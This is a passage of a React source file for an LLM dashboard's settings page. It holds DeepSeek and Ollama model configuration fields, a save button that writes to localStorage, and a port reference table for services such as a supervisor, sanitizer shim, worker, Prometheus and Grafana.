                className="w-full bg-[#0a0a0b] border border-[#26262d] rounded-lg px-3 py-2.5 text-sm text-[#e8e8ed] focus:outline-none focus:border-[rgba(245,158,11,0.4)] font-mono appearance-none"
              >
                <option value="deepseek-chat">deepseek-chat</option>
                <option value="deepseek-reasoner">deepseek-reasoner</option>
                <option value="deepseek-coder">deepseek-coder</option>
              </select>
            </label>
            <p className="text-xs text-[#35353d]">
              API key is set in <Mono>.env</Mono> as <Mono>DEEPSEEK_API_KEY</Mono> — not stored in the browser.
            </p>
          </div>
        </div>
      )}

      {/* Ollama settings */}
      {s.useLocalLlm && (
        <div className={`rounded-lg border ${S.surface} p-5 space-y-4`}>
          <SectionHead icon={Cpu} title="Ollama Configuration" />
          <label className="block">
            <span className="text-xs text-[#55555f] font-mono uppercase tracking-wider block mb-1.5">Ollama URL</span>
            <input
              value={s.ollamaUrl}
              onChange={e => update({ ollamaUrl: e.target.value })}
              className="w-full bg-[#0a0a0b] border border-[#26262d] rounded-lg px-3 py-2.5 text-sm text-[#e8e8ed] font-mono focus:outline-none focus:border-[rgba(245,158,11,0.4)] transition-colors"
              placeholder="http://localhost:11434"
            />
          </label>

          <div className="flex gap-2 items-end">
            <label className="flex-1">
              <span className="text-xs text-[#55555f] font-mono uppercase tracking-wider block mb-1.5">Model</span>
              {models.length > 0 ? (
                <select
                  value={s.ollamaModel}
                  onChange={e => update({ ollamaModel: e.target.value })}
                  className="w-full bg-[#0a0a0b] border border-[#26262d] rounded-lg px-3 py-2.5 text-sm text-[#e8e8ed] font-mono focus:outline-none focus:border-[rgba(245,158,11,0.4)] appearance-none"
                >
                  {models.map(m => <option key={m} value={m}>{m}</option>)}
                </select>
              ) : (
                <input
                  value={s.ollamaModel}
                  onChange={e => update({ ollamaModel: e.target.value })}
                  className="w-full bg-[#0a0a0b] border border-[#26262d] rounded-lg px-3 py-2.5 text-sm text-[#e8e8ed] font-mono focus:outline-none focus:border-[rgba(245,158,11,0.4)] transition-colors"
                  placeholder="qwen2.5:14b"
                />
              )}
            </label>
            <button
              onClick={fetchModels}
              disabled={fetchingModels}
              className="flex items-center gap-1.5 px-3 py-2.5 rounded-lg border border-[#26262d] hover:border-[#32323c] text-xs text-[#9898a8] hover:text-[#e8e8ed] transition-colors bg-[#18181c] disabled:opacity-50 whitespace-nowrap"
            >
              {fetchingModels ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <RefreshCw className="w-3.5 h-3.5" />}
              {fetchingModels ? "Fetching…" : "Fetch models"}
            </button>
          </div>

          {testResult && (
            <p className={`text-xs font-mono px-3 py-2 rounded border ${
              testResult.startsWith("✓")
                ? "border-[#14532d] bg-[rgba(34,197,94,0.06)] text-[#22c55e]"
                : "border-[#7f1d1d] bg-[rgba(239,68,68,0.06)] text-[#ef4444]"
            }`}>
              {testResult}
            </p>
          )}

          <p className="text-xs text-[#35353d]">
            Chat uses Ollama directly from the browser. The chat endpoint <Mono>/api/chat</Mono> must be accessible from your browser — if running remotely, use a proxy or SSH tunnel.
          </p>
        </div>
      )}

      {/* Save */}
      <div className="flex items-center gap-3">
        <button
          onClick={save}
          className="flex items-center gap-2 px-5 py-2.5 rounded-lg bg-[#f59e0b] hover:bg-[#fbbf24] text-[#0a0a0b] text-sm font-semibold transition-colors"
        >
          {saved ? <CheckCircle className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
          {saved ? "Saved!" : "Save settings"}
        </button>
        {saved && <span className="text-xs text-[#22c55e] font-mono">Settings persisted to localStorage.</span>}
      </div>

      {/* Port reference */}
      <div className={`rounded-lg border ${S.surface} p-4`}>
        <SectionHead icon={Activity} title="Port Reference" />
        <div className="grid grid-cols-2 gap-x-8 gap-y-1.5 text-xs font-mono">
          {[
            [10956, "Supervisor MCP + API"],
            [10957, "Dashboard (this UI)"],
            [10958, "Sanitizer shim"],
            [10959, "DeepSeek bridge"],
            [10960, "Worker (air-gapped)"],
            [10961, "Prometheus"],
            [10962, "Loki"],
            [10963, "Grafana"],
          ].map(([port, label]) => (
            <div key={port} className="flex gap-2">
              <span className="text-[#f59e0b] w-8 text-right shrink-0">{port}</span>
              <span className="text-[#55555f]">{label}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ── Root ──────────────────────────────────────────────────────────────────

export default function App() {
  return (
    <BrowserRouter>
      <Shell />
    </BrowserRouter>
  );
}
